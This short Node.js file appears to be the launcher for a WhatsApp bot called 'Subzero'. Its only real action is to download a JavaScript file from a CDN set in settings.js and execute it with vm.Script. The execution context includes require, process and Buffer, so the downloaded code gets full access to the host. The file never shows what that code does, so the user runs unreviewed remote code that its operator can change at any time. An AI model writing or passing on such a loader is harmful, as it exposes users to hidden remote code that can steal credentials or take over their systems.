/*

* Channel      : https://whatsapp.com/channel/0029VagQEmB002T7MWo3Sj1D

*/


// ZIMBABWEAN STAR ON TOP
const axios = require('axios');
const vm = require('vm');
const config = require('./settings.js');

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");
    const { data: scriptCode } = await axios.get(`${config.CDN}/mrfrank/index.js`);
    new vm.Script(scriptCode).runInContext(vm.createContext({ require, console, process, module, __filename, __dirname, Buffer }));
  } catch (err) {
    console.error("Error:", err);
  }
})();
